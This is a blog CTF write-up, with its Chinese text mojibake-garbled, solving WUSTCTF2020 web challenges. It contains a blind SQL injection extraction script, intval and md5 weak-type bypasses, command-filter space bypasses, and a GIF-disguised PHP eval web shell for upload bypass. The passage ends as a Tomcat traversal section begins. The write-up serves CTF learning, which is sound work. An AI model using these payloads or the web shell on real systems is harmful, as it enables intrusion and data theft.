<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="[WUSTCTF2020]Web Writeup"><meta name="keywords" content="python,å‘½ä»¤ç»•è¿‡,Tomcat"><meta name="author" content="Neorah"><meta name="copyright" content="Neorah"><title>[WUSTCTF2020]Web Writeup | Neorah's Blog</title><link rel="shortcut icon" href="/img/melody-favicon32.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"DBINOT6FYU","apiKey":"c8bb9d887053d084aa4aee885c26cac5","indexName":"dev_Neorah","hits":{"per_page":10},"languages":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}.","hits_stats":"${hits} results found in ${time} ms"}},
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#é¢œå€¼æˆç»©æŸ¥è¯¢"><span class="toc-number">1.</span> <span class="toc-text">é¢œå€¼æˆç»©æŸ¥è¯¢</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#æœ´å®æ— å"><span class="toc-number">2.</span> <span class="toc-text">æœ´å®æ— å</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ç»•è¿‡intval"><span class="toc-number">2.1.</span> <span class="toc-text">ç»•è¿‡intval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5å¼±ç±»å‹"><span class="toc-number">2.2.</span> <span class="toc-text">md5å¼±ç±»å‹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#å‘½ä»¤æ‰§è¡Œç©ºæ ¼ç»•è¿‡"><span class="toc-number">2.3.</span> <span class="toc-text">å‘½ä»¤æ‰§è¡Œç©ºæ ¼ç»•è¿‡</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CV-Maker"><span class="toc-number">3.</span> <span class="toc-text">CV Maker</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyweb"><span class="toc-number">4.</span> <span class="toc-text">easyweb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcatæ–‡ä»¶åŒ…å«æ¼æ´"><span class="toc-number">4.0.1.</span> <span class="toc-text">Tomcatæ–‡ä»¶åŒ…å«æ¼æ´</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#è§£é¢˜"><span class="toc-number">4.0.2.</span> <span class="toc-text">è§£é¢˜</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Train-Yourself-To-Be-Godly"><span class="toc-number">5.</span> <span class="toc-text">Train Yourself To Be Godly</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcatç›®å½•ç©¿è¶Š"><span class="toc-number">5.1.</span> <span class="toc-text">Tomcatç›®å½•ç©¿è¶Š</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcatç®¡ç†åå°"><span class="toc-number">5.2.</span> <span class="toc-text">Tomcatç®¡ç†åå°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ä¸Šä¼ WAR"><span class="toc-number">5.3.</span> <span class="toc-text">ä¸Šä¼ WAR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ä¿®æ”¹cookie"><span class="toc-number">5.4.</span> <span class="toc-text">ä¿®æ”¹cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">5.5.</span> <span class="toc-text">getshell</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/neorah.jpg"></div><div class="author-info__name text-center">Neorah</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/Neorah" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">42</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">37</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">36</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Friends</div><a class="author-info-links__name text-center" href="http://blog.happysec.cn" target="_blank" rel="noopener">å°åŒ—</a><a class="author-info-links__name text-center" href="https://ha1c9on.top/" target="_blank" rel="noopener">ha1c9on</a><a class="author-info-links__name text-center" href="http://www.const27.com" target="_blank" rel="noopener">const27</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/top.JPG)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Neorah's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Posts</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">[WUSTCTF2020]Web Writeup</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-23</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/">ctf</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ä»£ç å®¡è®¡</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/">php</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/sql%E6%B3%A8%E5%85%A5/">sqlæ³¨å…¥</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">å‘½ä»¤æ‰§è¡Œ</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/sql%E6%B3%A8%E5%85%A5/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">å¸ƒå°”ç›²æ³¨</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/">ç›®å½•ç©¿è¶Š</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">æ–‡ä»¶ä¸Šä¼ </a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0/">å›¾ç‰‡ä¸Šä¼ </a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">3.2k</span><span class="post-meta__separator">|</span><span>Reading time: 11 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="é¢œå€¼æˆç»©æŸ¥è¯¢"></a>é¢œå€¼æˆç»©æŸ¥è¯¢</h1><p>äºŒåˆ†æ³•ç›²æ³¨ï¼š</p>
<p>è¿™é‡Œpayloadç”¨1&amp;1ä¹Ÿå¯ä»¥çš„ï¼Œä½†æ˜¯è¦å…ˆè½¬ä¸ªç ï¼Œæ˜¯æˆ‘å‚»5555æˆ‘è¿˜ç–‘æƒ‘äº†å¥½ä¹…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://91e9396c-bf4b-4222-bded-b106b681143e.node3.buuoj.cn/index.php?stunum='</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1"</span></span><br><span class="line">payload2 = <span class="string">"1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where("</span> \</span><br><span class="line">           <span class="string">"table_schema='ctf')),&#123;&#125;,1))&gt;&#123;&#125;)^1 "</span></span><br><span class="line">payload3 = <span class="string">"1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where("</span> \</span><br><span class="line">           <span class="string">"table_name='flag')),&#123;&#125;,1))&gt;&#123;&#125;)^1 "</span></span><br><span class="line">payload4 = <span class="string">"1^(ascii(substr((select(group_concat(value))from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;)^1"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        payload = payload4.format(i, mid)</span><br><span class="line"></span><br><span class="line">        new_url = url + payload</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hi admin, your score is: 100"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>



<h1 id="æœ´å®æ— å"><a href="#æœ´å®æ— å" class="headerlink" title="æœ´å®æ— å"></a>æœ´å®æ— å</h1><p>è¿™ä¸ªç½‘ç«™æœ‰ç‚¹ä¹±ç â€¦</p>
<p>åˆšå¼€å§‹çœ‹çš„æ—¶å€™æˆ‘çœŸçš„æ¯«æ— å¤´ç»ª çœ‹wpè¯´è¦çœ‹robots.txt ï¼Ÿï¼Ÿæˆ‘æ€ä¹ˆçŸ¥é“ï¼Ÿï¼Ÿå¯èƒ½æ˜¯å› ä¸ºtitleå«åšâ€äººé—´æä¹botâ€å§ okkkk</p>
<p>æŸ¥çœ‹robots.txt,æ‰¾åˆ°ä¸€ä¸ª<code>/fAke_f1agggg.php</code>æ–‡ä»¶ï¼Œè®¿é—®åå¾—åˆ°å‡flagï¼Œä½†ç”±äºindex.phpä¸­å†™åˆ°<code>Cannot modify header information</code>ï¼Œäºæ˜¯åœ¨headerä¸­æ‰¾åˆ°äº†fl4g.php</p>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<img src="/ctf/WUSTCTF2020/1111.png" class="">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">   $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;"</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"wctf2020"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¿«åˆ°éæ´²äº†"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€æ—¦è€å¸ˆæ¢—hhhhh</p>
<h2 id="ç»•è¿‡intval"><a href="#ç»•è¿‡intval" class="headerlink" title="ç»•è¿‡intval"></a>ç»•è¿‡intval</h2><p>é¦–å…ˆç¬¬ä¸€å±‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨phpæ–‡æ¡£ä¸­æŸ¥è¯¢intvalï¼Œå®ƒç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚å¹¶ä¸”ç©ºçš„ array è¿”å› 0ï¼Œéç©ºçš„ array è¿”å› 1ã€‚</p>
<p>ä»ä»£ç æ¥çœ‹ï¼Œæˆ‘ä»¬éœ€è¦æ»¡è¶³<code>intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</code></p>
<p>ä»èŒƒä¾‹å¯ä»¥çœ‹å‡ºï¼Œintvalåœ¨å¤„ç†ç§‘å­¦è®°æ•°æ³•çš„å­—ç¬¦ä¸²æ—¶ï¼Œè¿”å›eå‰é¢çš„æ•°å­—ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> intval(<span class="string">"1e10"</span>); <span class="comment">//è¿”å›1</span></span><br><span class="line">	<span class="keyword">echo</span> intval(<span class="string">"2e10"</span>); <span class="comment">//è¿”å›2</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†å¦‚æœ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> intval(<span class="string">"1e10"</span>+<span class="number">1</span>); <span class="comment">//è¿”å›10000000001</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å› æ­¤å¯ä»¥æ„é€ <code>num=1e10</code>ç»•è¿‡è¿™å±‚çš„intval.</p>
<h2 id="md5å¼±ç±»å‹"><a href="#md5å¼±ç±»å‹" class="headerlink" title="md5å¼±ç±»å‹"></a>md5å¼±ç±»å‹</h2><p>ç¬¬äºŒå±‚ä»£ç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">   $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;"</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾ï¼Œgetä¸€ä¸ªå­—ç¬¦ä¸²å«md5ï¼Œä½¿å®ƒmd5ç¼–ç ä¸åŸå­—ç¬¦ä¸²å¼±ç›¸ç­‰ã€‚</p>
<p>å’Œä¸Šä¾‹ç±»ä¼¼ï¼Œè‹¥ä¸¤ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒçš„æ—¶å€™éƒ½æ˜¯0eå¼€å¤´ï¼Œä¸”åé¢éƒ½æ˜¯æ•°å­—ã€‚ç›´æ¥ä¼šå½“ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºçš„æ•°å‹æ¥æ¯”è¾ƒã€‚</p>
<img src="/ctf/WUSTCTF2020/3333.png" class="">

<p>å¯ä»¥å†™æˆè„šæœ¬ï¼Œæ„é€ â€0e+ä¾æ¬¡å¢é•¿çš„æ•°å­—â€œè¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œåˆ†åˆ«è®¡ç®—ä»–ä»¬çš„md5ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªmd5ç¬¦åˆâ€0eå¼€å¤´+åé¢å…¨æ•°å­—â€œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000000000</span>):</span><br><span class="line">a = â€˜<span class="number">0</span>eâ€˜+str(i)</span><br><span class="line">b = hashlib.md5(str(a).encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line"><span class="keyword">if</span> b[:<span class="number">2</span>]==â€˜<span class="number">0</span>eâ€˜ <span class="keyword">and</span> b[<span class="number">2</span>:].isdigit():</span><br><span class="line">print(a)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ç›´æ¥ç™¾åº¦8ï¼Œè¿™ç§ç½‘ä¸Šæ¯”è¾ƒå¤šã€‚</p>
<h2 id="å‘½ä»¤æ‰§è¡Œç©ºæ ¼ç»•è¿‡"><a href="#å‘½ä»¤æ‰§è¡Œç©ºæ ¼ç»•è¿‡" class="headerlink" title="å‘½ä»¤æ‰§è¡Œç©ºæ ¼ç»•è¿‡"></a>å‘½ä»¤æ‰§è¡Œç©ºæ ¼ç»•è¿‡</h2><p>ç¬¬ä¸‰å±‚ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"wctf2020"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¿«åˆ°éæ´²äº†"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ„æ€ä¸ºä¼ é€’çš„å‚æ•°ä¸­ä¸èƒ½å«æœ‰ç©ºæ ¼ï¼Œå¹¶ä¸”å¦‚æœå‚æ•°ä¸­æœ‰catçš„è¯å°±è½¬æ¢æˆwctf2020.</p>
<p>å…ˆlsä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å­˜flagçš„æ–‡ä»¶</p>
<img src="/ctf/WUSTCTF2020/2222.png" class="">

<p>ç„¶åæ‰“å¼€å®ƒã€‚è¿™é‡Œçš„catå¯ä»¥ç”¨<code>ca\t</code>ç»•è¿‡ï¼Œç©ºæ ¼å¯ä»¥ç”¨<code>$IFS$9</code>ã€<code>${IFS}</code>ã€<code>%09</code>ã€<code>&lt;</code>ç­‰ç»•è¿‡ã€‚æ„é€ å¥½åå¾—åˆ°flagã€‚</p>
<h1 id="CV-Maker"><a href="#CV-Maker" class="headerlink" title="CV Maker"></a>CV Maker</h1><p>è¿™é¢˜ä¸€ä¸Šæ¥å°±æ˜¯ä¸ªæ¨¡ç‰ˆï¼Œçœ‹èµ·æ¥å†…å®¹è¿˜æŒºå¤šæŒºå‰å®³çš„ï¼Œå…¶å®è¿˜è›®ç®€å•ã€‚</p>
<p>æ³¨å†Œä¸ªå·ç™»é™†åå°±æ¥åˆ°æ›´æ¢å¤´åƒç•Œé¢ã€‚</p>
<img src="/ctf/WUSTCTF2020/4444.png" class="">

<p>éšæ‰‹ç‚¹ä¸Šä¼ åï¼Œå‡ºç°è¿™æ ·ä¸€å¥warning.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Warning: exif_imagetype(): Filename cannot be empty in &#x2F;var&#x2F;www&#x2F;html&#x2F;profile.php on line 76</span><br></pre></td></tr></table></figure>

<p><code>exif_imagetype()</code>æ˜¯ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹çš„ï¼Œå®ƒè¯»å–å›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚</p>
<p>å› æ­¤ä¸Šä¼ ä¸ªå›¾ç‰‡é©¬å°±å¥½äº†.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?</span><br><span class="line">@eval($_POST[shell]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…æŠ“åŒ…ä¿®æ”¹Content-Typeä¸ºå›¾ç‰‡ä¹Ÿå¯ä»¥ã€‚</p>
<p>ä¸Šä¼ æˆåŠŸåè¿˜åœ¨å›¾ç‰‡å¤„ç»™å‡ºäº†åœ°å€ï¼Œè¿æ¥shellå°±èƒ½åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag.</p>
<img src="/ctf/WUSTCTF2020/5555.png" class="">



<h1 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h1><p><strong>55555æ„Ÿè°¢æ˜Ÿæ˜Ÿç»™æˆ‘æ¼”ç¤ºè¿™é“é¢˜ï¼è®©æˆ‘ä»¬ç‰¹åˆ«é¸£è°¢ä»–ï¼</strong></p>
<p>è¿™é¢˜ä¸€ä¸Šæ¥å°±æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œè®©æˆ‘ä»¬ä¸Šä¼ ä¸ªphpä¸Šå»ã€‚</p>
<img src="/ctf/WUSTCTF2020/6666.png" class="">

<p>ç»™äº†ä¸‹è½½é“¾æ¥ï¼Œå› æ­¤å¯èƒ½å­˜åœ¨ä»»æ„ä¸‹è½½æ¼æ´ï¼Œä½†ç”±äºä¸çŸ¥é“flagçš„ä½ç½®ï¼Œæ‰€ä»¥æ²¡åŠæ³•è¯»å–ã€‚</p>
<p>ä½†åœ¨ä¸‹è½½é“¾æ¥ä¸­å‡ºç°äº†<code>download?file=</code>,å› æ­¤å¯ä»¥çŒœæµ‹å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šã€‚éšæ„æ”¹ä¸ªfileåç§°ï¼Œå‘ç°æŠ¥é”™ã€‚å¹¶ä¸”åœ¨æŠ¥é”™çš„ç›®å½•ä¸­è¿˜å‘ç°äº†<code>tomcat</code>å­—æ ·ï¼Œå› æ­¤å¯ä»¥çŒœåˆ°æ˜¯ç”¨äº†tomcat serverï¼Œè¿›è€Œæƒ³åˆ°ä»Šå¹´çˆ†å‡ºçš„tomcatæ¼æ´ã€‚</p>
